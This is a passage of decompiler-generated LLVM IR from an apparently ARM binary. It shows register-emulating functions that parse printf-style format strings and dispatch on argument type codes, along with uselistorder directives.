  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_df8c ], [ %stack_var_-336.4, %dec_label_pc_df84 ]
  %v1_da3c180 = inttoptr i32 %v0_da3c49 to i8*
  %v2_da3c181 = load i8, i8* %v1_da3c180, align 1
  %v3_da3c182 = zext i8 %v2_da3c181 to i32
  store i32 %v3_da3c182, i32* %r3.global-to-local, align 4
  %v2_da40183 = icmp eq i8 %v2_da3c181, 0
  br i1 %v2_da40183, label %dec_label_pc_da58, label %bb126

dec_label_pc_df8c:                                ; preds = %dec_label_pc_da98
  %v1_df8c = add i32 %v0_daa0, 2
  store i32 %v1_df8c, i32* @r4, align 4
  br label %dec_label_pc_da3c.outer

dec_label_pc_df94:                                ; preds = %dec_label_pc_de04, %dec_label_pc_df68, %.thread36, %dec_label_pc_deb4, %dec_label_pc_de98, %dec_label_pc_dd68, %bb162, %dec_label_pc_dccc, %bb130, %dec_label_pc_df44
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_df9c

dec_label_pc_df9c:                                ; preds = %dec_label_pc_da8c, %bb, %dec_label_pc_da0c, %dec_label_pc_df94
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_da0c ], [ -1, %dec_label_pc_df94 ], [ %stack_var_-336.2, %dec_label_pc_da8c ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_d9c8, i32* @r5, align 4
  store i32 %v15_d9c8, i32* %r8.global-to-local, align 4
  store i32 %v18_d9c8, i32* @sb, align 4
  store i32 %v21_d9c8, i32* @sl, align 4
  store i32 %v24_d9c8, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_df8c, { 1, 0 }
  uselistorder i8 %v2_da3c181, { 1, 2, 0 }
  uselistorder i32 %v0_da3c49, { 2, 0, 1 }
  uselistorder i32 %v5_da68, { 2, 3, 1, 0 }
  uselistorder i32 %v0_db68, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_df84, { 1, 0, 2 }
  uselistorder i32 %v1_df18, { 2, 1, 0 }
  uselistorder i32 %v0_df20, { 1, 0, 2, 3 }
  uselistorder i32 %v0_dea0, { 1, 0 }
  uselistorder i32 %v2_de84, { 2, 0, 1 }
  uselistorder i1 %v3_de64, { 1, 0 }
  uselistorder i32 %v0_de74, { 0, 2, 3, 1 }
  uselistorder i32 %v2_de48, { 1, 0 }
  uselistorder i32 %v0_de8c, { 1, 0, 2 }
  uselistorder i32 %v3_de1c, { 1, 2, 0 }
  uselistorder i32 %v0_ddcc, { 1, 0 }
  uselistorder i32 %v2_ddb0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_dd78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_dd44, { 1, 2, 0, 3 }
  uselistorder i32 %v1_dc48, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_dc64, { 1, 2, 3, 0 }
  uselistorder i32 %v6_dbe4, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_db48, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_daf8.pre, { 2, 1, 0 }
  uselistorder i32 %v1_daf0, { 1, 0 }
  uselistorder i32 %v1_da98, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_da58, { 1, 0 }
  uselistorder i32 %v1_da50.lcssa, { 1, 0 }
  uselistorder i8 %v2_da3c, { 1, 2, 0 }
  uselistorder i32 %v2_da50, { 1, 2, 3, 0 }
  uselistorder i1 %v7_dc5c, { 1, 0 }
  uselistorder i1 %v7_dba8, { 1, 2, 0 }
  uselistorder i1 %v7_dda0, { 1, 0 }
  uselistorder i1 %v7_dd00, { 1, 0 }
  uselistorder i1 %v7_dbec, { 1, 0 }
  uselistorder i32 %v2_dd40, { 0, 2, 1, 3 }
  uselistorder i32 %v2_de10, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_db20, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_daf4, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_dad4, { 1, 2, 0 }
  uselistorder i32 %v4_dacc, { 1, 0 }
  uselistorder i32 %v2_d9d0, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 39, 33, 34, 1, 2, 35, 36, 0, 37, 38, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r2.global-to-local, { 19, 3, 4, 22, 23, 24, 25, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 2, 17, 18, 20, 21, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 11, 13, 12, 15, 14, 37, 36, 38, 39, 41, 40, 8, 42, 7, 43, 6, 44, 16, 34, 17, 32, 18, 33, 19, 9, 20, 4, 21, 22, 23, 5, 3, 24, 25, 26, 10, 35, 2, 27, 29, 28, 30, 1, 31, 0 }
  uselistorder i32 (i32, i8, i32)* @function_d8f8, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_11570, { 1, 0 }
  uselistorder label %dec_label_pc_df9c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_df94, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_df84, { 1, 0 }
  uselistorder label %dec_label_pc_df44, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_deb4, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_de60, { 1, 0 }
  uselistorder label %dec_label_pc_de44, { 0, 2, 1 }
  uselistorder label %dec_label_pc_de44thread-pre-split, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_de38, { 1, 0 }
  uselistorder label %dec_label_pc_de30, { 1, 0 }
  uselistorder label %dec_label_pc_de28, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_ddbc, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_db98, { 1, 0 }
  uselistorder label %dec_label_pc_db94, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_daec, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_da8c, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_da58, { 2, 1, 0 }
}

define i32 @function_dfbc(i32* %arg1) local_unnamed_addr {
dec_label_pc_dfbc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_dfbc = load i32, i32* @r4, align 4
  store i32 %v3_dfbc, i32* %stack_var_-12, align 4
  %v6_dfbc = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_dfc8 = load i32, i32* @r1, align 4
  store i32 %v0_dfc8, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_dfd0 = bitcast i32* %arg1 to i8*
  %v3_dfd0 = call i32 @function_ef70(i8* %v2_dfd0, i32 0)
  %v0_dfd4 = load i32, i32* @r4, align 4
  %v1_dfd4 = add i32 %v0_dfd4, 24
  %v2_dfd4 = inttoptr i32 %v1_dfd4 to i32*
  %v3_dfd4 = load i32, i32* %v2_dfd4, align 4
  %v1_dfd8 = add i32 %v3_dfd4, -1
  store i32 %v1_dfd8, i32* %v2_dfd4, align 4
  %v0_dfe0 = load i32, i32* @r5, align 4
  %v1_dfe0 = load i32, i32* @r4, align 4
  %v2_dfe0 = inttoptr i32 %v1_dfe0 to i32*
  store i32 %v0_dfe0, i32* %v2_dfe0, align 4
  %v0_dfe4 = load i32, i32* @r4, align 4
  %v1_dfe4 = add i32 %v0_dfe4, 40
  store i32 %v1_dfe4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_dff419 = inttoptr i32 %v1_dfe4 to i32*
  store i32 8, i32* %v2_dff419, align 4
  %v3_dff420 = load i32, i32* %r1.global-to-local, align 4
  %v4_dff421 = add i32 %v3_dff420, 4
  store i32 %v4_dff421, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge

dec_label_pc_dfec.dec_label_pc_dfec_crit_edge:    ; preds = %dec_label_pc_dfbc, %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge
  %v4_dff422 = phi i32 [ %v4_dff421, %dec_label_pc_dfbc ], [ %v4_dff4, %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge ]
  %v0_dff0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_dff0 = add i32 %v0_dff0.pre, -1
  store i32 %v1_dff0, i32* %r2.global-to-local, align 4
  %v7_dff0 = icmp eq i32 %v0_dff0.pre, 1
  %v2_dff4 = inttoptr i32 %v4_dff422 to i32*
  store i32 8, i32* %v2_dff4, align 4
  %v3_dff4 = load i32, i32* %r1.global-to-local, align 4
  %v4_dff4 = add i32 %v3_dff4, 4
  store i32 %v4_dff4, i32* %r1.global-to-local, align 4
  br i1 %v7_dff0, label %dec_label_pc_dffc, label %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge

dec_label_pc_dffc:                                ; preds = %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge
  %v0_dffc = load i32, i32* @r5, align 4
  store i32 %v0_dffc, i32* %r2.global-to-local, align 4
  %v1_e0403 = inttoptr i32 %v0_dffc to i8*
  %v2_e0404 = load i8, i8* %v1_e0403, align 1
  %v2_e0446 = icmp eq i8 %v2_e0404, 0
  br i1 %v2_e0446, label %dec_label_pc_e04c, label %dec_label_pc_e00c

dec_label_pc_e004:                                ; preds = %dec_label_pc_e024
  %v2_e008 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e008, i32* @r4, align 4
  store i32 %v6_dfbc, i32* @r5, align 4
  ret i32 -1

dec_label_pc_e00c:                                ; preds = %dec_label_pc_dffc, %dec_label_pc_e040.backedge
  %v0_e014 = phi i32 [ %storemerge, %dec_label_pc_e040.backedge ], [ %v0_dffc, %dec_label_pc_dffc ]
  %v2_e0407 = phi i8 [ %v2_e040, %dec_label_pc_e040.backedge ], [ %v2_e0404, %dec_label_pc_dffc ]
  %v7_e00c = icmp eq i8 %v2_e0407, 37
  br i1 %v7_e00c, label %dec_label_pc_e014, label %dec_label_pc_e03c

dec_label_pc_e014:                                ; preds = %dec_label_pc_e00c
  %v1_e014 = add i32 %v0_e014, 1
  %v2_e014 = inttoptr i32 %v1_e014 to i8*
  %v3_e014 = load i8, i8* %v2_e014, align 1
  store i32 %v1_e014, i32* %r2.global-to-local, align 4
  %v7_e018 = icmp eq i8 %v3_e014, 37
  br i1 %v7_e018, label %dec_label_pc_e03c, label %dec_label_pc_e024

dec_label_pc_e024:                                ; preds = %dec_label_pc_e014
  %v0_e01c = load i32, i32* @r4, align 4
  %v2_e024 = inttoptr i32 %v0_e01c to i32*
  store i32 %v1_e014, i32* %v2_e024, align 4
  %v2_e028 = call i32 @function_e274(i32* %v2_e024)
  %v1_e02c = icmp slt i32 %v2_e028, 0
  br i1 %v1_e02c, label %dec_label_pc_e004, label %dec_label_pc_e034

dec_label_pc_e034:                                ; preds = %dec_label_pc_e024
  %v0_e034 = load i32, i32* @r4, align 4
  %v1_e034 = inttoptr i32 %v0_e034 to i32*
  %v2_e034 = load i32, i32* %v1_e034, align 4
  br label %dec_label_pc_e040.backedge

dec_label_pc_e03c:                                ; preds = %dec_label_pc_e00c, %dec_label_pc_e014
  %v0_e03c = phi i32 [ %v0_e014, %dec_label_pc_e00c ], [ %v1_e014, %dec_label_pc_e014 ]
  %v1_e03c = add i32 %v0_e03c, 1
  br label %dec_label_pc_e040.backedge

dec_label_pc_e040.backedge:                       ; preds = %dec_label_pc_e03c, %dec_label_pc_e034
  %storemerge = phi i32 [ %v1_e03c, %dec_label_pc_e03c ], [ %v2_e034, %dec_label_pc_e034 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_e040 = inttoptr i32 %storemerge to i8*
  %v2_e040 = load i8, i8* %v1_e040, align 1
  %v2_e044 = icmp eq i8 %v2_e040, 0
  br i1 %v2_e044, label %dec_label_pc_e040.dec_label_pc_e04c_crit_edge, label %dec_label_pc_e00c

dec_label_pc_e040.dec_label_pc_e04c_crit_edge:    ; preds = %dec_label_pc_e040.backedge
  %v0_e04c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e04c

dec_label_pc_e04c:                                ; preds = %dec_label_pc_e040.dec_label_pc_e04c_crit_edge, %dec_label_pc_dffc
  %v0_e04c = phi i32 [ %v0_e04c.pre, %dec_label_pc_e040.dec_label_pc_e04c_crit_edge ], [ %v0_dffc, %dec_label_pc_dffc ]
  %v3_e040.lcssa.in = phi i8 [ %v2_e040, %dec_label_pc_e040.dec_label_pc_e04c_crit_edge ], [ %v2_e0404, %dec_label_pc_dffc ]
  %v3_e040.lcssa = zext i8 %v3_e040.lcssa.in to i32
  %v1_e04c = load i32, i32* @r4, align 4
  %v2_e04c = inttoptr i32 %v1_e04c to i32*
  store i32 %v0_e04c, i32* %v2_e04c, align 4
  %v2_e050 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e050, i32* @r4, align 4
  store i32 %v6_dfbc, i32* @r5, align 4
  ret i32 %v3_e040.lcssa

; uselistorder directives
  uselistorder i8 %v2_e040, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_dffc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dff4, { 1, 0 }
  uselistorder i32 %v0_dff0.pre, { 1, 0 }
  uselistorder i32 %v6_dfbc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_e03c, { 1, 0 }
  uselistorder label %dec_label_pc_e00c, { 1, 0 }
  uselistorder label %dec_label_pc_dfec.dec_label_pc_dfec_crit_edge, { 1, 0 }
}

define i32 @function_e054(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e054:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e054 = load i32, i32* @r4, align 4
  store i32 %v3_e054, i32* %stack_var_-12, align 4
  %v1_e058 = add i32 %arg1, 24
  %v2_e058 = inttoptr i32 %v1_e058 to i32*
  %v3_e058 = load i32, i32* %v2_e058, align 4
  store i32 %v3_e058, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_e068 = add i32 %arg1, 76
  %v3_e068 = inttoptr i32 %v2_e068 to i32*
  store i32 %arg2, i32* %v3_e068, align 4
  %v7_e06c = icmp sgt i32 %v3_e058, 0
  br i1 %v7_e06c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_e054
  %v10_e06c = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_e06c, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %dec_label_pc_e054
  %v0_e070 = load i32, i32* %r3.global-to-local, align 4
  %v2_e070 = add i32 %arg1, 8
  %v3_e070 = inttoptr i32 %v2_e070 to i32*
  store i32 %v0_e070, i32* %v3_e070, align 4
  %v0_e074 = load i32, i32* %r5.global-to-local, align 4
  %v2_e074 = add i32 %arg1, 28
  %v3_e074 = inttoptr i32 %v2_e074 to i32*
  store i32 %v0_e074, i32* %v3_e074, align 4
  %v0_e078 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e078, i32* %v2_e058, align 4
  %v0_e07c = load i32, i32* %r3.global-to-local, align 4
  %v2_e07c = add i32 %arg1, 4
  %v3_e07c = inttoptr i32 %v2_e07c to i32*
  store i32 %v0_e07c, i32* %v3_e07c, align 4
  %v0_e080 = call i32 @function_e08c()
  %v0_e084 = load i32, i32* %r5.global-to-local, align 4
  %v1_e084 = load i32, i32* @r4, align 4
  %v2_e084 = add i32 %v1_e084, 24
  %v3_e084 = inttoptr i32 %v2_e084 to i32*
  store i32 %v0_e084, i32* %v3_e084, align 4
  %v2_e088 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e088, i32* @r4, align 4
  ret i32 %v0_e080

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_e08c, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 4, 5, 2, 1, 3, 7 }
}

define i32 @function_e08c() local_unnamed_addr {
dec_label_pc_e08c:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_e08c = load i32, i32* @r0, align 4
  %v1_e08c = add i32 %v0_e08c, 24
  %v2_e08c = inttoptr i32 %v1_e08c to i32*
  %v3_e08c = load i32, i32* %v2_e08c, align 4
  store i32 %v3_e08c, i32* %r1.global-to-local, align 4
  %v2_e090 = icmp eq i32 %v3_e08c, 0
  %v3_e094 = load i32, i32* @r4, align 4
  store i32 %v3_e094, i32* %stack_var_-8, align 4
  %v1_e098 = add i32 %v0_e08c, 80
  store i32 %v1_e098, i32* %ip.global-to-local, align 4
  %v1_e09c = add i32 %v0_e08c, 8
  %v2_e09c = inttoptr i32 %v1_e09c to i32*
  %v3_e09c = load i32, i32* %v2_e09c, align 4
  store i32 %v3_e09c, i32* %r3.global-to-local, align 4
  %v6_e0a4 = icmp eq i32 %v3_e09c, -2147483648
  br i1 %v2_e090, label %dec_label_pc_e0a4, label %dec_label_pc_e1c8

dec_label_pc_e0a4:                                ; preds = %dec_label_pc_e08c
  br i1 %v6_e0a4, label %dec_label_pc_e0ac, label %dec_label_pc_e0c4

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_e0a4
  %v1_e0ac = add i32 %v0_e08c, 76
  %v2_e0ac = inttoptr i32 %v1_e0ac to i32*
  %v3_e0ac = load i32, i32* %v2_e0ac, align 4
  store i32 %v3_e0ac, i32* %r3.global-to-local, align 4
  %v1_e0b0 = inttoptr i32 %v3_e0ac to i32*
  %v2_e0b0 = load i32, i32* %v1_e0b0, align 4
  store i32 %v2_e0b0, i32* %r2.global-to-local, align 4
  %v1_e0b4 = add i32 %v3_e0ac, 4
  store i32 %v1_e0b4, i32* %r3.global-to-local, align 4
  store i32 %v1_e0b4, i32* %v2_e0ac, align 4
  %v0_e0bc = load i32, i32* %r2.global-to-local, align 4
  %v1_e0bc = load i32, i32* @r0, align 4
  %v2_e0bc = add i32 %v1_e0bc, 8
  %v3_e0bc = inttoptr i32 %v2_e0bc to i32*
  store i32 %v0_e0bc, i32* %v3_e0bc, align 4
  %v0_e0c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0c0 = load i32, i32* @r0, align 4
  %v2_e0c0 = add i32 %v1_e0c0, 80
  %v3_e0c0 = inttoptr i32 %v2_e0c0 to i32*
  store i32 %v0_e0c0, i32* %v3_e0c0, align 4
  %v0_e0c4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e0a4, %dec_label_pc_e0ac
  %v1_e0dc = phi i32 [ %v0_e08c, %dec_label_pc_e0a4 ], [ %v0_e0c4.pre, %dec_label_pc_e0ac ]
  %v1_e0c4 = add i32 %v1_e0dc, 4
  %v2_e0c4 = inttoptr i32 %v1_e0c4 to i32*
  %v3_e0c4 = load i32, i32* %v2_e0c4, align 4
  store i32 %v3_e0c4, i32* %r3.global-to-local, align 4
  %v6_e0c8 = icmp eq i32 %v3_e0c4, -2147483648
  br i1 %v6_e0c8, label %dec_label_pc_e0d0, label %dec_label_pc_e0e8

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4
  %v1_e0d0 = add i32 %v1_e0dc, 76
  %v2_e0d0 = inttoptr i32 %v1_e0d0 to i32*
  %v3_e0d0 = load i32, i32* %v2_e0d0, align 4
  store i32 %v3_e0d0, i32* %r3.global-to-local, align 4
  %v1_e0d4 = inttoptr i32 %v3_e0d0 to i32*
  %v2_e0d4 = load i32, i32* %v1_e0d4, align 4
  store i32 %v2_e0d4, i32* %r2.global-to-local, align 4
  %v1_e0d8 = add i32 %v3_e0d0, 4
  store i32 %v1_e0d8, i32* %r3.global-to-local, align 4
  store i32 %v1_e0d8, i32* %v2_e0d0, align 4
  %v0_e0e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0e0 = load i32, i32* @r0, align 4
  %v2_e0e0 = add i32 %v1_e0e0, 4
  %v3_e0e0 = inttoptr i32 %v2_e0e0 to i32*
  store i32 %v0_e0e0, i32* %v3_e0e0, align 4
  %v0_e0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0e4 = load i32, i32* @r0, align 4
  %v2_e0e4 = add i32 %v1_e0e4, 80
  %v3_e0e4 = inttoptr i32 %v2_e0e4 to i32*
  store i32 %v0_e0e4, i32* %v3_e0e4, align 4
  %v0_e1b818.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e0e8

dec_label_pc_e0e8:                                ; preds = %dec_label_pc_e0c4, %dec_label_pc_e0d0
  %v0_e1b818 = phi i32 [ %v1_e0dc, %dec_label_pc_e0c4 ], [ %v0_e1b818.pre, %dec_label_pc_e0d0 ]
  %v0_e0e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e0e8, i32* @lr, align 4
  %v1_e1b819 = add i32 %v0_e1b818, 28
  %v2_e1b820 = inttoptr i32 %v1_e1b819 to i32*
  %v3_e1b821 = load i32, i32* %v2_e1b820, align 4
  store i32 %v3_e1b821, i32* %r3.global-to-local, align 4
  %v5_e1c023 = icmp slt i32 %v0_e0e8, %v3_e1b821
  br i1 %v5_e1c023, label %dec_label_pc_e0f0, label %dec_label_pc_e1c4.loopexit

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0e8, %dec_label_pc_e1b4
  %v0_e1b825 = phi i32 [ %v0_e1b8, %dec_label_pc_e1b4 ], [ %v0_e1b818, %dec_label_pc_e0e8 ]
  %v1_e0f024 = phi i32 [ %v1_e1b4, %dec_label_pc_e1b4 ], [ %v0_e0e8, %dec_label_pc_e0e8 ]
  %v4_e0f0 = mul i32 %v1_e0f024, 4
  %v5_e0f0 = add i32 %v0_e1b825, %v4_e0f0
  store i32 %v5_e0f0, i32* %r3.global-to-local, align 4
  %v1_e0f4 = add i32 %v5_e0f0, 40
  %v2_e0f4 = inttoptr i32 %v1_e0f4 to i32*
  %v3_e0f4 = load i32, i32* %v2_e0f4, align 4
  store i32 %v3_e0f4, i32* %r2.global-to-local, align 4
  %v7_e0f8 = icmp eq i32 %v3_e0f4, 8
  br i1 %v7_e0f8, label %dec_label_pc_e1b4, label %dec_label_pc_e100

dec_label_pc_e100:                                ; preds = %dec_label_pc_e0f0
  %v1_e100 = add i32 %v0_e1b825, 76
  %v2_e100 = inttoptr i32 %v1_e100 to i32*
  %v3_e100 = load i32, i32* %v2_e100, align 4
  store i32 %v3_e100, i32* %r1.global-to-local, align 4
  %v8_e104 = icmp sgt i32 %v3_e0f4, 8
  br i1 %v8_e104, label %dec_label_pc_e128, label %dec_label_pc_e108

dec_label_pc_e108:                                ; preds = %dec_label_pc_e100
  %v7_e108 = icmp eq i32 %v3_e0f4, 2
  br i1 %v7_e108, label %dec_label_pc_e174, label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e108
  %v8_e110 = icmp sgt i32 %v3_e0f4, 2
  br i1 %v8_e110, label %dec_label_pc_e120, label %dec_label_pc_e114

dec_label_pc_e114:                                ; preds = %dec_label_pc_e110
  %v1_e114 = icmp slt i32 %v3_e0f4, 0
  br i1 %v1_e114, label %dec_label_pc_e1a0, label %dec_label_pc_e174

dec_label_pc_e120:                                ; preds = %dec_label_pc_e110
  %v7_e120 = icmp eq i32 %v3_e0f4, 7
  br i1 %v7_e120, label %dec_label_pc_e188, label %dec_label_pc_e1a0

dec_label_pc_e128:                                ; preds = %dec_label_pc_e100
  %v7_e128 = icmp eq i32 %v3_e0f4, 1024
  br i1 %v7_e128, label %dec_label_pc_e174, label %dec_label_pc_e130

dec_label_pc_e130:                                ; preds = %dec_label_pc_e128
  %v8_e130 = icmp sgt i32 %v3_e0f4, 1024
  br i1 %v8_e130, label %dec_label_pc_e148, label %dec_label_pc_e134

dec_label_pc_e134:                                ; preds = %dec_label_pc_e130
  switch i32 %v3_e0f4, label %dec_label_pc_e1a0 [
    i32 256, label %dec_label_pc_e174
    i32 512, label %dec_label_pc_e174
  ]

dec_label_pc_e148:                                ; preds = %dec_label_pc_e130
  %v7_e148 = icmp eq i32 %v3_e0f4, 2048
  br i1 %v7_e148, label %dec_label_pc_e160, label %dec_label_pc_e158

dec_label_pc_e158:                                ; preds = %dec_label_pc_e148
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_e154 = icmp eq i32 %v3_e0f4, 2055
  br i1 %v9_e154, label %dec_label_pc_e188, label %dec_label_pc_e1a0

dec_label_pc_e160:                                ; preds = %dec_label_pc_e148
  %v1_e160 = add i32 %v3_e100, 8
  store i32 %v1_e160, i32* %r3.global-to-local, align 4
  store i32 %v1_e160, i32* %v2_e100, align 4
  %v0_e168 = load i32, i32* %r1.global-to-local, align 4
  %v1_e168 = inttoptr i32 %v0_e168 to i32*
  %v2_e168 = load i32, i32* %v1_e168, align 4
  store i32 %v2_e168, i32* %r3.global-to-local, align 4
  %v3_e168 = add i32 %v0_e168, 4
  %v4_e168 = inttoptr i32 %v3_e168 to i32*
  %v5_e168 = load i32, i32* %v4_e168, align 4
  store i32 %v5_e168, i32* %r4.global-to-local, align 4
  %v0_e16c = load i32, i32* %ip.global-to-local, align 4
  %v1_e16c = inttoptr i32 %v0_e16c to i32*
  store i32 %v2_e168, i32* %v1_e16c, align 4
  %v3_e16c = add i32 %v0_e16c, 4
  %v4_e16c = inttoptr i32 %v3_e16c to i32*
  %v5_e16c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_e16c, i32* %v4_e16c, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e174:                                ; preds = %dec_label_pc_e134, %dec_label_pc_e134, %dec_label_pc_e114, %dec_label_pc_e128, %dec_label_pc_e108
  %v1_e174 = inttoptr i32 %v3_e100 to i32*
  %v2_e174 = load i32, i32* %v1_e174, align 4
  store i32 %v2_e174, i32* %r2.global-to-local, align 4
  %v1_e178 = add i32 %v3_e100, 4
  store i32 %v1_e178, i32* %r3.global-to-local, align 4
  store i32 %v1_e178, i32* %v2_e100, align 4
  %v0_e180 = load i32, i32* %r2.global-to-local, align 4
  %v1_e180 = load i32, i32* %ip.global-to-local, align 4
  %v2_e180 = inttoptr i32 %v1_e180 to i32*
  store i32 %v0_e180, i32* %v2_e180, align 4
  br label %dec_label_pc_e1b0

dec_label_pc_e188:                                ; preds = %dec_label_pc_e120, %dec_label_pc_e158
  %v3_e188 = load i32, i32* %v2_e100, align 4
  store i32 %v3_e188, i32* %r2.global-to-local, align 4
  %v1_e18c = add i32 %v3_e188, 8
  store i32 %v1_e18c, i32* %r3.global-to-local, align 4
  store i32 %v1_e18c, i32* %v2_e100, align 4
  %v0_e194 = load i32, i32* %r2.global-to-local, align 4
  %v1_e194 = inttoptr i32 %v0_e194 to i32*
  %v2_e194 = load i32, i32* %v1_e194, align 4
  store i32 %v2_e194, i32* %r3.global-to-local, align 4
  %v3_e194 = add i32 %v0_e194, 4
  %v4_e194 = inttoptr i32 %v3_e194 to i32*
  %v5_e194 = load i32, i32* %v4_e194, align 4
  store i32 %v5_e194, i32* %r4.global-to-local, align 4
  %v0_e198 = load i32, i32* %ip.global-to-local, align 4
  %v1_e198 = inttoptr i32 %v0_e198 to i32*
  store i32 %v2_e194, i32* %v1_e198, align 4
  %v3_e198 = add i32 %v0_e198, 4
  %v4_e198 = inttoptr i32 %v3_e198 to i32*
  %v5_e198 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_e198, i32* %v4_e198, align 4
  br label %dec_label_pc_e1b0

